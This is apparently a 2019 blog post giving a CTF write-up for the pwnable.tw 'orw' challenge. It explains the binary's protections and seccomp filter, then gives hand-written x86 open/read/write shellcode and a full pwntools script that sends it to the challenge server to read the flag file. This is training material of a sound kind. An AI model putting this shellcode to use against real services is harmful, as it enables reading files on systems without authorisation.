---
layout: post
title:  "Open Read Write shellcoding"
date:   2019-09-09 10:55:00
categories: experience
description: this article explains about ctf writeup.
tags: ctf-writeup pwn
---

# orw writeup [pwnable.tw]


Challenge description

	Read the flag from /home/orw/flag.
	Only open read write syscall are allowed to use.
	nc chall.pwnable.tw 10001


In this challenge we are given a binary , this is information about
the binary

	orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

And here are some of the protections that are active in this binary

<img src="/images/2019-12-04-135243_511x105_scrot.png">

Yea, the NX protection is disabled , so we can run our code inside the stack segment

## Reverse engineering

Okay we've got some information we need , now it's time to look at the decompilation
let's open it on ghidra and see the main function

<img src="/images/2019-12-04-140618_359x196_scrot.png">

As you can see , we can input data up to 200 bytes and our input will be stored
at shellcode buffer , and after input the binary will jump to our buffer.
and if you notice that , there is orw_seccomp() function , let's use seccomp-tools
to gathering more information

<img src="/images/2019-12-04-141345_527x245_scrot.png">

This binary allow us to use those syscall, so we can try to open the flag inside
/home/orw/flag and read the value to buffer , and write the buffer.
so it's time to write some asm  , before we write the exploit we have to see syscall code you can use this site
[here](https://syscalls.kernelgrok.com/) and search for sys_open , and this is what we got

<img src="/images/2019-12-04-142625_952x76_scrot.png" class="center" style="width: 800px;">

## Exploit

We have to set eax register to 0x5 and ebx to our file path and more
so firstly to open the file, i make assembly code, like this

<img src="/images/2019-12-04-144810_250x246_scrot.png">

It will xor eax with eax so the value will set to 0 and we do the same
instructions for ecx , and mov eax with 0x5 (sys_open syscall) so now eax value will have
0x5 (sys_open syscall) , and after that i push ecx and the string (as hex) to stack
and mov ebx with esp

let's do read

<img src="/images/2019-12-04-145249_222x159_scrot.png">

Actually we mov eax with 0x3 (sys_read syscall) and mov ecx with ebx ,ecx is our buffer
and mov ebx with 0x3 because fd and mov dl with 0x30 for the size

and finally lets write it out

<img src="/images/2019-12-04-145735_225x117_scrot.png">

mov eax with 0x4 (sys_write syscall) and mov bl with 0x1 for fd

and don't forget every time we write shellcode that call a syscall we have to use int 0x80 at the end of our shellcode ,  int 0x80 is the assembly language instruction that is used to invoke system calls in Linux on x86 (i.e., Intel-compatible) processors.

here is my full exploit code :

{% highlight python %}
from pwn import *
def main():
	# sys_open()
	shellcode = asm('''
			xor 	eax, eax
			xor 	ecx, ecx
			mov 	eax, 0x5
			push 	ecx
			push 	0x67616c66       
			push 	0x2f77726f       
			push 	0x2f656d6f       
			push 	0x682f2f2f       
			mov 	ebx, esp
			int 	0x80
		''')
	# sys_read()
	shellcode += asm('''
			mov 	eax, 0x3
			mov 	ecx, ebx
			mov 	ebx, 0x3
			mov 	dl, 0x30
			int 	0x80
		''')
	# sys_write()
	shellcode += asm('''
			mov 	eax, 0x4
			mov 	bl, 0x1
			int 0x80
		''')
	#r = process("./orw")
	r = remote("chall.pwnable.tw",10001)
	r.sendline(shellcode)
	r.interactive()
if __name__ == '__main__':
	main()
{% endhighlight %}


And here is our flag :
<img src="/images/2019-12-04-151953_496x97_scrot.png">
